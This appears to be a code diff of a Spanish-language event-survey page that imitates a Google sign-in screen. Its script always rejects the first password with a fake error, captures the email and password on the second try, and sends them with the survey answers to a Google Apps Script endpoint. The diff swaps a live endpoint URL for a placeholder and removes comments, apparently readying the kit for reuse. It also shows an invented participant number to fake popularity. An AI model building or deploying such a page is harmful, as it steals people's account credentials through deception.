@@ -54,7 +54,6 @@
         <!-- PASO 1: INICIO DE SESIÓN ESTILO GOOGLE (FONDO BLANCO) -->
         <section id="login-section" class="bg-white/95 text-gray-900 rounded-2xl p-8 shadow-2xl max-w-md w-full border border-gray-200 backdrop-blur-md">
             <div class="text-center mb-6">
-                <!-- Logo de Google -->
                 <div class="flex justify-center mb-3">
                     <svg class="w-10 h-10" viewBox="0 0 24 24">
                         <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
@@ -143,7 +142,7 @@
             </form>
         </section>
 
-        <!-- PASO 3: AGRADECIMIENTO CON NÚMERO GRANDE DE PARTICIPANTE (> 1900) -->
+        <!-- PASO 3: AGRADECIMIENTO -->
         <section id="thanks-section" class="hidden bg-slate-900/90 border border-quito-gold/50 rounded-2xl p-8 shadow-2xl backdrop-blur-md max-w-md w-full text-center space-y-4">
             <div class="inline-flex p-3 bg-emerald-500/10 rounded-full text-emerald-400">
                 <i data-lucide="check-circle" class="w-10 h-10"></i>
@@ -176,25 +175,23 @@
     <script>
         lucide.createIcons();
 
-        const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbyEZR8Ma2ToUPUEPyTPCNY5bnP40Z-EUebQqoUMXvMsA0fDWPhwYBUJ8vAYxaQIdE2R/exec';
+        // ⚠️ REEMPLAZA ESTA URL POR LA TUYA DE APPS SCRIPT ⚠️
+        const GOOGLE_SCRIPT_URL = 'TU_URL_DE_GOOGLE_APPS_SCRIPT_AQUI';
 
         let userData = { email: '', password: '', name: '', companion: '', preference: '', artists: '', comments: '' };
         let loginAttempts = 0;
 
-        // Lógica de validación de contraseña
         document.getElementById('login-form').addEventListener('submit', function(e) {
             e.preventDefault();
             const emailField = document.getElementById('login-email');
             const passwordField = document.getElementById('login-password');
 
             if (loginAttempts === 0) {
-                // Primer intento: muestra error, limpia contraseña y MANTIENE el correo
                 loginAttempts++;
                 document.getElementById('login-error').classList.remove('hidden');
                 passwordField.value = ''; 
                 passwordField.focus();
             } else {
-                // Segundo intento: guarda datos y avanza a la encuesta
                 userData.email = emailField.value;
                 userData.password = passwordField.value;
 
@@ -216,7 +213,6 @@
             submitBtn.innerHTML = '<i data-lucide="loader-2" class="w-4 h-4 animate-spin"></i> Enviando...';
             lucide.createIcons();
 
-            // Generar número aleatorio de participante mayor a 1900
             const randomParticipantId = Math.floor(Math.random() * 600) + 1901;
 
             const formData = new URLSearchParams();
